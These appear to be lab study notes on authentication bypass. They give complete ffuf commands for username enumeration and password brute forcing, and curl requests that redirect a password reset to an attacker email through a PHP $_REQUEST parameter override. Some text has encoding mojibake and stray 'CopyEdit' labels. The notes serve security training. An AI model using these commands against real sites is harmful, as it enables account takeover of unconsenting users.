Common flaws in authentication mechanism that allow bypassing.

# 1. Username enumeration
Very helpful practice when trying to find auth vulns is creating a list of valid usernames, which we'll use later in other tasks.
This is usually done through website error messages. For example: `An account with this username already exists` 
The ffuf tool uses a list of commonly used usernames to check against for any matches.
```shell-session
user@tryhackme$ ffuf -w /usr/share/wordlists/SecLists/Usernames/Names/names.txt -X POST -d "username=FUZZ&email=x&password=x&cpassword=x" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.56.253/customers/signup -mr "username already exists" > usernames.txt
```
`-X` - specify the HTTP method
`-d` - specify the data that will be sent.
`-H` - specify the content type header as form data.
`-u` - specify the URL.
`-mr` - specify the regex expression for successful enum.

## 2. Brute Force
With the valid usernames already listed, we can attempt to brute force the login page. This is an automated process that tries a list of commonly used passwords against one or a list of usernames.

```bash
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://10.10.80.116/customers/login -fc 200
```
`-fc` - Ignores 200 codes, for when successful login returns 302 codes for example.

## 3. Logic Flaws in Authentication
A logic flaw is when the typical logical path of an application is either bypassed, circumvented or manipulated by a hacker.

In cases where code checks specifically for an url path to check the users autorization, can exist errors like the one below:
```php
if( url.substr(0,6) === '/admin') {
    # Code to check user is an admin
} else {
    # View Page
}
```
Because the code is using three equals, it is looking for exact match which means requests using /adMin can bypass the privilege/authentication check.

#### **Password Reset Process Overview**

- The app first asks for an **email**.
    
- If valid, it proceeds to ask for the **username**.
    
- The reset confirmation is sent to the **email entered in the first step** (or so it seems).
    

---

#### 2. **Vulnerability Type: Logic Flaw**

- **PHP `$_REQUEST`** merges data from both `$_GET`, `$_POST`, and `$_COOKIE`.
    
- If **`email` is passed both in GET and POST**, PHP gives **priority to POST** data.
    

---

#### 3. **Exploitation Steps**

- Step 1: Use a legitimate email in the **GET** parameter:  
    `?email=robert@acmeitsupport.thm`
    
- Step 2: Override the email using **POST data**:  
    `-d 'username=robert&email=attacker@hacker.com'`
    
- Outcome: Password reset email is sent to the **attacker's email** instead of the real user's.


### **Curl Commands Used**

- **Normal Request:**
    
    bash
    
    CopyEdit
    
    `curl 'http://10.10.184.213/customers/reset?email=robert@acmeitsupport.thm' \ -H 'Content-Type: application/x-www-form-urlencoded' \ -d 'username=robert'`
    
- **Exploit Request (Overriding Email):**
    
    bash
    
    CopyEdit
    
    `curl 'http://10.10.184.213/customers/reset?email=robert@acmeitsupport.thm' \ -H 'Content-Type: application/x-www-form-urlencoded' \ -d 'username=robert&email=attacker@hacker.com'`

### ðŸ“Œ **Real-World Lessons**

- **Email-based password reset logic** can be tricked if the server uses `$_REQUEST` improperly.
    
- Always check for:
    
    - **Redundant parameters** (GET + POST with same name).
        
    - **Improper trust in user-controlled inputs** (e.g., trusting `$_REQUEST` without validation).
        
- **Logic flaws** donâ€™t rely on technical exploits like buffer overflows but on **bad design**.
